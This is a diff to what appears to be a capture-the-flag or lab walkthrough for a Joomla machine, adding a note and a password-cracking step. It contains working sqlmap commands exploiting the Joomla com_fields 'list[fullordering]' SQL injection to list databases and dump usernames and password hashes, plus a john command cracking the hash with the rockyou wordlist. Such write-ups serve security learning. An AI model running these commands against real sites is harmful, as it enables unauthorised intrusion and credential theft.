@@ -120,12 +120,16 @@ Run SQLMap using the arguments specified in the exploit:
 
     sqlmap -u "http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 
-The [users table](https://docs.joomla.org/Tables/users) may contain credentials to access the Joomla administration 
-section.
+Takes ages. Instead, take a shorter route. The [users table](https://docs.joomla.org/Tables/users) may contain 
+credentials to access the Joomla administration section.
 
 Dump the username and password columns from the `users` table:
 
     sqlmap -u "http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" -C username,password -p list[fullordering] --dump
+
+Put hash in a file named `hash.txt` and crack the hash:
+
+    # john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 ### Privilege escalation
 
